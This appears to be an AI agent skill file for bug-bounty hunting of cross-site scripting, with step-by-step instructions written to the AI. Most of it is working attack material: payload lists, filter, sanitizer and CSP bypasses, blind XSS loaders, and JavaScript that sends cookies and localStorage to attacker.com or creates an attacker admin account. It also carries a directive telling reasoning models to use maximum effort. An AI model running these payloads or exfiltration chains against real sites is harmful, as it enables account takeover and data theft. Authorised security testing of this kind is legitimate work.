---
name: xss-hunter
description: Systematically hunt for Cross-Site Scripting vulnerabilities across all injection contexts: reflected, stored, DOM-based, mutation-based (mXSS), and blind XSS. Covers sink/source mapping from JS recon, CSP bypass techniques, filter evasion, and full impact chain escalation to account takeover, credential theft, and sensitive data exfiltration. Use this skill whenever a target reflects user input in HTML, JSON API responses consumed by the frontend, URL fragments, or client-side JavaScript. Trigger on phrases like "xss testing", "xss-hunter", "cross-site scripting", "reflected xss", "stored xss", "dom xss", "test for xss", "check for injection", or when recon reveals parameters reflected in responses, rich text editors, comment fields, user profile fields, search inputs, error messages, or any endpoint where user input appears in the rendered page.
---

# XSS Hunter Skill

You are hunting for Cross-Site Scripting vulnerabilities. XSS is still one of the most common and consistently rewarded bug classes in web bug bounty — but the gap between a Low and a Critical is entirely about context and impact chain. A reflected XSS behind authentication with no session theft potential is Low. A stored XSS in an admin panel that fires on every support ticket view is Critical. Your job is to find the injection, characterize the context, build the highest-impact chain, and prove it.

Run all phases in order. Phase 1 maps every injection surface from recon before you send a single payload. Phase 2 tests reflection context. Phase 3 breaks filters. Phase 4 covers DOM and blind XSS. Phase 5 builds the impact chain.

> **THINKING LLM DIRECTIVE — MAXIMUM EFFORT REQUIRED**
> If you are a reasoning/thinking model (o1, o3, Claude with extended thinking, Gemini with thinking, DeepSeek-R1, QwQ, or any model with a dedicated reasoning/thinking phase): **activate maximum thinking budget for this skill**. XSS context analysis, filter bypass construction, CSP evaluation, and DOM sink tracing require deep multi-step reasoning. Shallow analysis produces false negatives and wasted payloads. Think fully before acting on every phase transition, every bypass decision, and every impact chain assessment. Do not truncate your reasoning. The quality of this skill's output is directly proportional to the depth of thought applied.

---

## Prerequisites

- Burp Suite active (proxy all browser traffic during manual testing)
- Two accounts (attacker + victim) for stored XSS and session theft confirmation
- Blind XSS callback infrastructure: [XSS Hunter](https://xsshunter.trufflesecurity.com) or self-hosted, or Burp Collaborator
- All assets confirmed IN SCOPE via `/scope-checker`

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/xss
export BLIND_XSS_URL="https://your-id.xss.ht"  # from XSS Hunter or equivalent
```

---

## Phase 1 — Surface Mapping

### Step 1.1 — Identify Reflection Points from Recon

Before sending any payload, map every endpoint that may reflect input:

```bash
# Extract all parameters from katana crawl and wayback
grep -iEh '[?&][a-zA-Z_0-9]+=.' \
  $TARGET_DIR/recon/api/katana-crawl.txt \
  $TARGET_DIR/recon/api/all-endpoints.txt 2>/dev/null | \
  grep -oP '[?&]\K[a-zA-Z_0-9]+(?==)' | sort | uniq -c | sort -rn | \
  head -50 > $TARGET_DIR/recon/xss/parameter-frequency.txt

cat $TARGET_DIR/recon/xss/parameter-frequency.txt
```

```bash
# Search all recon endpoints for XSS-prone parameter names
XSS_PARAMS="q|search|query|s|term|keyword|name|title|comment|message|body"
XSS_PARAMS+="|content|text|description|bio|note|input|value|data|filter"
XSS_PARAMS+="|error|msg|alert|notice|feedback|subject|reply|post|status"
XSS_PARAMS+="|lang|locale|format|template|theme|page|view|ref|callback"

grep -iEh "[?&](${XSS_PARAMS})=" \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/api/katana-crawl.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/xss/candidate-params.txt

echo "[*] XSS candidate parameters: $(wc -l < $TARGET_DIR/recon/xss/candidate-params.txt)"
```

### Step 1.2 — Map DOM XSS Sources and Sinks from JS

```bash
# Sources: where user-controlled data enters JavaScript
grep -rn --include="*.js" -iE \
  '(location\.search|location\.hash|location\.href|document\.URL|
    document\.referrer|window\.name|postMessage|localStorage\.getItem|
    sessionStorage\.getItem|document\.cookie|URLSearchParams|getParam|
    queryString|\$_GET|decodeURI|decodeURIComponent)' \
  $TARGET_DIR/recon/js/ 2>/dev/null | \
  grep -v '.min.js' | head -40 > $TARGET_DIR/recon/xss/dom-sources.txt

# Sinks: where data lands that could execute
grep -rn --include="*.js" -iE \
  '(innerHTML|outerHTML|insertAdjacentHTML|document\.write|document\.writeln|
    eval\(|setTimeout\(|setInterval\(|Function\(|execScript|
    location\.href\s*=|location\.replace\(|location\.assign\(|
    src\s*=|href\s*=|action\s*=|\$\(|jQuery\()' \
  $TARGET_DIR/recon/js/ 2>/dev/null | \
  grep -v '.min.js' | head -40 >> $TARGET_DIR/recon/xss/dom-sources.txt

echo "[*] DOM source/sink candidates:"
wc -l $TARGET_DIR/recon/xss/dom-sources.txt
cat $TARGET_DIR/recon/xss/dom-sources.txt | head -30
```

### Step 1.3 — Identify High-Value XSS Surfaces

Classify each candidate surface by priority:

| Priority | Surface Type | Why |
|---|---|---|
| **Critical** | Admin panel input fields | Fires on admin — session theft = ATO |
| **Critical** | Support ticket / helpdesk fields | Fires when staff views ticket |
| **Critical** | User display name / profile bio | Rendered on other users' pages |
| **High** | Stored comments / posts / reviews | Rendered to all visitors |
| **High** | Search query reflected in page | Reflected but widely shareable |
| **High** | Error messages with user input | Reflected, often less filtered |
| **Medium** | Authenticated-only reflected XSS | Requires victim to be logged in |
| **Low** | Self-XSS only (no sharing vector) | Can only harm self |

For each candidate parameter, assign a priority label and record it:
```bash
cat >> $TARGET_DIR/recon/xss/surface-priority.txt << 'EOF'
[PRIORITY] | [ENDPOINT] | [PARAMETER] | [SURFACE TYPE] | [NOTES]
EOF
```

---

## Phase 2 — Reflection Context Analysis

Before choosing payloads, you must know the injection context. The context determines everything.

### Step 2.1 — Inject a Unique Canary and Observe

For each candidate parameter, inject a unique canary string (not a payload) and observe exactly where and how it appears in the response:

```bash
CANARY="xsscanary$(date +%s)"

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${CANARY}" \
  -H "Cookie: $SESSION_COOKIE" \
  --max-time 10 | \
  grep -n "$CANARY" > /tmp/canary-reflection.txt

cat /tmp/canary-reflection.txt
```

For each reflection, classify the context:

| Context | Example reflection | Payload type needed |
|---|---|---|
| **HTML body** | `<p>xsscanary</p>` | `<script>` or event handler |
| **HTML attribute (unquoted)** | `<input value=xsscanary>` | `onmouseover=alert(1)` |
| **HTML attribute (double-quoted)** | `<input value="xsscanary">` | `"><script>` or `" onmouseover=` |
| **HTML attribute (single-quoted)** | `<input value='xsscanary'>` | `'><script>` or `' onmouseover=` |
| **Inside `<script>` block** | `var x = "xsscanary";` | `";alert(1)//` |
| **Inside JS string (single-quoted)** | `var x = 'xsscanary';` | `';alert(1)//` |
| **URL / href attribute** | `<a href="/path?xsscanary">` | `javascript:alert(1)` |
| **JSON response (API)** | `{"name":"xsscanary"}` | Depends on how frontend renders it |
| **HTML comment** | `<!-- xsscanary -->` | `-->` breakout |
| **CSS context** | `style="color:xsscanary"` | CSS expression (IE only) / breakout |

Record the exact context for each reflection before proceeding to payloads.

### Step 2.2 — Check Encoding and Sanitization

```bash
# Test which characters are reflected as-is vs. encoded
CHAR_TEST='<>"'\''&/\\`=(){}[];'
for CHAR in '<' '>' '"' "'" '&' '/' '\\' '`' '=' '(' ')'; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=TEST${CHAR}AFTER" \
    -H "Cookie: $SESSION_COOKIE" --max-time 8 | \
    grep -o "TEST.*AFTER" | head -1)
  echo "[${CHAR}] -> ${RESULT}"
done
```

From the output, build a **character allow-list**: which characters survive unmodified. This determines which payload constructs are viable.

---

## Phase 3 — Payload Testing and Filter Bypass

### Step 3.1 — Context-Appropriate Baseline Payloads

Use ONLY the payload constructs that match the characters available from Step 2.2. Do not blindly spray payloads:

```bash
# HTML body context
HTML_PAYLOADS=(
  '<script>alert(document.domain)</script>'
  '<img src=x onerror=alert(document.domain)>'
  '<svg onload=alert(document.domain)>'
  '<details open ontoggle=alert(document.domain)>'
  '<body onload=alert(document.domain)>'
)

# Attribute (double-quoted) context
ATTR_DQ_PAYLOADS=(
  '" onmouseover="alert(document.domain)"'
  '"><script>alert(document.domain)</script>'
  '" autofocus onfocus="alert(document.domain)"'
  '")<script>alert(document.domain)</script>'
)

# Attribute (single-quoted) context
ATTR_SQ_PAYLOADS=(
  "' onmouseover='alert(document.domain)'"
  "'><script>alert(document.domain)</script>"
)

# Script block context
SCRIPT_PAYLOADS=(
  '";alert(document.domain)//'
  "';alert(document.domain)//"
  '</script><script>alert(document.domain)</script>'
  '\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e'
)

# URL/href context
URL_PAYLOADS=(
  'javascript:alert(document.domain)'
  'javascript:void(alert(document.domain))'
  'data:text/html,<script>alert(document.domain)</script>'
)

# Test the appropriate set for this context
for PAYLOAD in "${HTML_PAYLOADS[@]}"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 8)
  # Check if payload is reflected unmodified
  if echo "$RESULT" | grep -Fq "$(echo $PAYLOAD | head -c 20)"; then
    echo "[REFLECTED-UNMODIFIED] $PAYLOAD"
  elif echo "$RESULT" | grep -iEq '(alert|onerror|onload|onmouseover|onfocus|svg|script)'; then
    echo "[PARTIAL-REFLECTION] $PAYLOAD"
  else
    echo "[BLOCKED/ENCODED] $PAYLOAD"
  fi
done
```

### Step 3.2 — Filter Bypass Techniques

When baseline payloads are blocked, apply bypass techniques based on what the filter is blocking:

**Tag name filtering:**
```bash
# Case variation
'<ScRiPt>alert(1)</ScRiPt>'
'<SCRIPT>alert(1)</SCRIPT>'
# Tag obfuscation with extra characters
'<scr\x00ipt>alert(1)</scr\x00ipt>'
'<scr ipt>alert(1)</scr ipt>'
# Alternative tags
'<svg/onload=alert(1)>'
'<math><mtext></mtext></math><img src=x onerror=alert(1)>'
'<object data="javascript:alert(1)">'
'<embed src="javascript:alert(1)">'
'<iframe srcdoc="<script>alert(1)</script>">'
'<input autofocus onfocus=alert(1)>'
'<select autofocus onfocus=alert(1)>'
'<textarea autofocus onfocus=alert(1)>'
'<video><source onerror=alert(1)>'
```

**Event handler filtering:**
```bash
# Use rare/less-filtered handlers
'<img src=x onanimationstart=alert(1) style="animation:a">'
'<form id=x></form><button form=x formaction=javascript:alert(1)>'
'<object data=javascript:alert(1)>'
'<svg><animate onbegin=alert(1) attributeName=x>'
'<svg><set onbegin=alert(1) attributeName=x>'
'<marquee onstart=alert(1)>'
```

**JavaScript keyword filtering:**
```bash
# alert() alternatives for WAF bypass
'<svg onload=confirm(1)>'
'<svg onload=prompt(1)>'
'<img src=x onerror=console.log(document.cookie)>'
# Encoded alert
'<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'
# String concatenation
'<img src=x onerror="al"+"ert(1)">'
# Using window
'<img src=x onerror=window["al"+"ert"](1)>'
# Template literals
'<img src=x onerror=`alert\`1\``>'
# fromCharCode
'<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'
```

**Angle bracket filtering (attribute injection only):**
```bash
# If < > are blocked but the injection is inside an existing tag attribute
'" onmouseover="alert(1)' # No angle brackets needed
'" autofocus onfocus="alert(1)'
'" tabindex=0 onfocusin="alert(1)'
```

**Encoding bypasses:**
```bash
# Double URL encoding
'%253Cscript%253Ealert(1)%253C/script%253E'
# HTML entity encoding (works in attribute values)
'&lt;script&gt;alert(1)&lt;/script&gt;'
# Unicode encoding
'\u003cscript\u003ealert(1)\u003c/script\u003e'
# Hex encoding in CSS
'\3c script\3e alert(1)\3c/script\3e'
```

### Step 3.3 — CSP Analysis and Bypass

```bash
# Read the CSP header from the target
CSP=$(curl -sk -I "$BASE_URL" \
  -H "Cookie: $SESSION_COOKIE" | \
  grep -i 'content-security-policy' | head -1)

echo "CSP: $CSP"
```

Analyze the CSP for weaknesses:

```bash
# Check for common CSP weaknesses
python3 << 'EOF'
import re, sys

csp = """REPLACE_WITH_CSP_VALUE"""

weaknesses = []

if "unsafe-inline" in csp:
    weaknesses.append("[CRITICAL] unsafe-inline in script-src — inline scripts allowed")

if "unsafe-eval" in csp:
    weaknesses.append("[HIGH] unsafe-eval in script-src — eval() allowed")

if re.search(r"\*\.\S+", csp):
    weaknesses.append("[HIGH] Wildcard subdomain in script-src — any subdomain can host scripts")

if "data:" in csp:
    weaknesses.append("[HIGH] data: URI in script-src — data: script execution allowed")

if re.search(r"https?://[^;]*(cdn|ajax|cdn\.jsdelivr|unpkg|cdnjs)", csp):
    weaknesses.append("[MEDIUM] Public CDN in script-src — CDN bypass may be possible via hosted payloads")

if "'nonce-" not in csp and "'sha" not in csp and "strict-dynamic" not in csp:
    weaknesses.append("[MEDIUM] No nonce/hash/strict-dynamic — allowlist-based CSP may be bypassable")

if not weaknesses:
    print("[INFO] No obvious CSP weaknesses detected — test JSONP endpoints and trusted domain abuse")
else:
    for w in weaknesses:
        print(w)
EOF
```

**Common CSP bypass techniques:**

| CSP Weakness | Bypass Technique |
|---|---|
| Trusted CDN (e.g. cdn.jsdelivr.net) | Host payload at `cdn.jsdelivr.net/npm/[package]/payload.js` |
| Wildcard subdomain (`*.target.com`) | Find XSS on any subdomain, use it to load scripts |
| JSONP endpoint on allowlisted domain | `<script src="https://trusted.com/api/jsonp?callback=alert(1)">` |
| `unsafe-inline` present | Standard inline `<script>` works |
| `strict-dynamic` only | Get a nonce from page source, reuse if static |
| `data:` allowed | `<script src="data:,alert(1)">` |

```bash
# Hunt for JSONP endpoints on allowlisted domains
CSP_DOMAINS=$(echo "$CSP" | grep -oP "https?://[^;'\" ]+" | sort -u)
for DOMAIN in $CSP_DOMAINS; do
  for CALLBACK_PARAM in "callback" "cb" "jsonp" "call" "func" "handler"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
      "${DOMAIN}?${CALLBACK_PARAM}=test" --max-time 5)
    BODY=$(curl -sk "${DOMAIN}?${CALLBACK_PARAM}=test" --max-time 5 | head -c 100)
    if echo "$BODY" | grep -q "test("; then
      echo "[JSONP] ${DOMAIN}?${CALLBACK_PARAM}= -> $BODY"
    fi
  done
done
```

---

## Phase 4 — DOM XSS and Blind XSS

### Step 4.1 — DOM XSS Testing

DOM XSS does not require server-side reflection — it lives entirely in client-side JavaScript. Test sources that feed data to sinks without going through the server:

```bash
# Test URL fragment (hash) as a DOM XSS source
# These need browser testing — curl won't process JS
# Identify which pages use location.hash in JS (from dom-sources.txt)
grep 'location.hash\|location.search\|document.referrer' \
  $TARGET_DIR/recon/xss/dom-sources.txt

# For each identified source → sink flow, construct a test URL:
# https://target.com/page#<img src=x onerror=alert(document.domain)>
# https://target.com/page?param=<img src=x onerror=alert(document.domain)>

# Test postMessage DOM XSS
curl -sk "$BASE_URL" -H "Cookie: $SESSION" | \
  grep -iE 'addEventListener.*message|window\.on.*message|postMessage' | head -10
```

**For postMessage DOM XSS testing**, construct an HTML PoC page:
```html
<!-- postMessage DOM XSS test page -->
<html><body>
<iframe id="target" src="https://TARGET_DOMAIN/vulnerable-page"></iframe>
<script>
  setTimeout(() => {
    document.getElementById('target').contentWindow.postMessage(
      '<img src=x onerror=alert(document.domain)>',
      'https://TARGET_DOMAIN'
    );
  }, 2000);
</script>
</body></html>
```

### Step 4.2 — Mutation XSS (mXSS)

Some sanitizers are bypassed by HTML that mutates when parsed by the browser's HTML parser:

```bash
# Classic mXSS payloads that bypass DOMPurify and similar sanitizers
mXSS_PAYLOADS=(
  # Namespace confusion
  '<math><mtext></mtext></math><img src=x onerror=alert(1)>'
  '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>'
  # Template element abuse
  '<template><script>alert(1)</script></template>'
  # noscript trick
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'
  # Table parsing quirks
  '<table><td><script>alert(1)</script></td></table>'
  # SVG animate
  '<svg><animate href=? attributeName=? values=javascript:alert(1)>'
  # Foreign content in SVG
  '<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><iframe onload=alert(1)></iframe></div></foreignObject></svg>'
)

for PAYLOAD in "${mXSS_PAYLOADS[@]}"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 8)
  echo "$RESULT" | grep -Fqi "$(echo $PAYLOAD | head -c 15)" && \
    echo "[mXSS-CANDIDATE] $PAYLOAD" || echo "[FILTERED] $PAYLOAD"
done
```

### Step 4.3 — Blind XSS

For fields where output is not visible to the attacker (admin panels, support tickets, log viewers, audit trails, email templates), inject blind XSS payloads that call back when executed:

```bash
# Inject blind XSS payload into every stored input field
BLIND_PAYLOAD="</textarea></script><script src=${BLIND_XSS_URL}></script>"

# Variants to cover different contexts
BLIND_VARIANTS=(
  "<script src=${BLIND_XSS_URL}></script>"
  "'\"><script src=${BLIND_XSS_URL}></script>"
  "</textarea><script src=${BLIND_XSS_URL}></script>"
  "</title><script src=${BLIND_XSS_URL}></script>"
  "javascript:eval('var a=document.createElement(\'script\');a.src=\'${BLIND_XSS_URL}\';document.body.appendChild(a)')"
  "<img src=x onerror=\"var s=document.createElement('script');s.src='${BLIND_XSS_URL}';document.head.appendChild(s)\">"
)

echo "[*] Target every stored-input field with blind XSS variants:"
echo "Fields to target:"
echo "  - User profile: name, bio, website, company, job title"
echo "  - Support/contact: subject, message body, name, phone"
echo "  - Feedback/review: title, body, rating comments"
echo "  - App settings: webhook URL, notification name, integration label"
echo "  - API fields: any string field stored and later rendered in an admin UI"
echo ""
echo "Blind XSS callback URL: $BLIND_XSS_URL"
echo "Monitor callback dashboard for execution."
```

---

## Phase 5 — Impact Chain and PoC

### Step 5.1 — Session Cookie Theft

Once XSS is confirmed, build the cookie theft PoC if cookies are not HttpOnly:

```bash
# Check if session cookies are HttpOnly
curl -sk -I "https://$TARGET_DOMAIN/" \
  -H "Cookie: $SESSION_COOKIE" | \
  grep -i 'set-cookie' | grep -i 'session\|auth\|token'
```

If HttpOnly is NOT set:
```javascript
// Cookie theft payload (include in XSS payload)
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
```

If HttpOnly IS set — escalate via DOM:
```javascript
// Steal localStorage and sessionStorage tokens
new Image().src = 'https://attacker.com/steal'
  + '?ls=' + encodeURIComponent(JSON.stringify(localStorage))
  + '&ss=' + encodeURIComponent(JSON.stringify(sessionStorage));
```

### Step 5.2 — Account Takeover Chain (Stored/Admin XSS)

For stored XSS that fires in an admin context:

```javascript
// Admin XSS ATO chain: add attacker as admin user via API call
fetch('/api/admin/users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json', 'X-CSRFToken': document.cookie.match(/csrf=([^;]+)/)?.[1] || ''},
  body: JSON.stringify({email: 'attacker@evil.com', role: 'admin', password: 'Pwned123!'})
}).then(r => r.json()).then(d => new Image().src = 'https://attacker.com/exfil?d=' + btoa(JSON.stringify(d)));
```

For stored XSS that fires on other regular users:
```javascript
// CSRF-via-XSS: perform sensitive action as victim
fetch('/api/account/email', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```

### Step 5.3 — Confirm Execution Context and Document PoC

For the final PoC, confirm execution context explicitly:

```javascript
// PoC payload: confirm domain, cookies, and storage state
(function() {
  var data = {
    domain: document.domain,
    origin: window.origin,
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    url: window.location.href
  };
  new Image().src = 'https://attacker.com/xss-poc?d=' + btoa(JSON.stringify(data));
})();
```

Document the PoC with:
1. The exact vulnerable URL and parameter
2. The exact payload used (URL-encoded if needed)
3. The exact response or browser behavior confirming execution
4. The execution context (domain, cookies visible, admin page vs. public page)
5. The impact chain (session theft / ATO / stored / DOM)

```bash
cat >> $TARGET_DIR/findings/xss-$(date +%Y%m%d-%H%M).md << 'EOF'
## XSS Finding

**URL:** [exact vulnerable URL]
**Parameter:** [param name]
**Type:** Reflected / Stored / DOM
**Context:** HTML body / Attribute / Script block / URL
**Payload:** [exact payload]
**Execution domain:** [document.domain value]
**Cookies visible:** [yes/no — HttpOnly status]
**Admin context fires:** [yes/no]
**Impact chain:** [session theft / ATO / stored multi-user]

**Request:**
```
[full HTTP request]
```

**Response / browser behavior:**
```
[response snippet showing reflection, or screenshot reference]
```
EOF
```

---

## Output Summary

All output written to `$TARGET_DIR/recon/xss/`:

| File | Contents |
|---|---|
| `parameter-frequency.txt` | Parameter names ranked by frequency across all endpoints |
| `candidate-params.txt` | XSS-prone parameters and endpoints |
| `dom-sources.txt` | JS source and sink candidates from recon |
| `surface-priority.txt` | Prioritized injection surfaces with context notes |

---

## Severity Reference

| Finding | Severity |
|---|---|
| Stored XSS in admin panel (fires on admin view) | Critical |
| Stored XSS → session theft / ATO on other users | Critical |
| Blind XSS confirmed executing in admin context | Critical |
| Stored XSS on public/shared page (multi-user) | High |
| Reflected XSS on login / OAuth flow page | High |
| DOM XSS with no user interaction required | High |
| Reflected XSS on authenticated page (requires victim to click) | Medium |
| Blind XSS payload injected, no callback yet | Medium (pending) |
| Self-XSS only (no sharing vector, no privilege difference) | Informational |
| XSS blocked by strong CSP with no bypass found | Informational |

---

## Guiding Principles

- **Context before payload.** Always inject a canary and map the reflection context before choosing a payload. Spraying generic payloads at unknown contexts wastes time and produces false negatives. The context determines the payload construct.
- **Stored XSS is almost always higher severity than reflected.** If a field is stored and rendered to other users, escalate the severity accordingly. The privilege of the user who views the stored content determines the ceiling impact.
- **Self-XSS is not a finding.** If the only person who can trigger the XSS is the attacker themselves, it is Informational at best and will be N/A'd. There must be a vector to fire the payload in another user's browser.
- **HttpOnly cookies don't neutralize XSS.** If session cookies are HttpOnly, pivot to localStorage/sessionStorage token theft, CSRF-via-XSS, or direct API calls from the victim's context. Document these alternatives in the report.
- **CSP is not a blocker — it is a puzzle.** Analyze every CSP for JSONP endpoints on allowlisted domains, CDN bypass opportunities, and wildcard subdomain abuse before concluding XSS is unexploitable due to CSP.
- **Blind XSS requires patience.** Inject into every stored field, then wait. Do not rule out blind XSS because you haven't received a callback within one session. Admin review flows can take hours or days.
- **Run /triager before submitting.** Self-XSS, XSS behind multi-step auth with no realistic exploit path, and XSS with an unbypassable CSP will be N/A'd or downgraded. Confirm the execution context and impact chain before submitting.
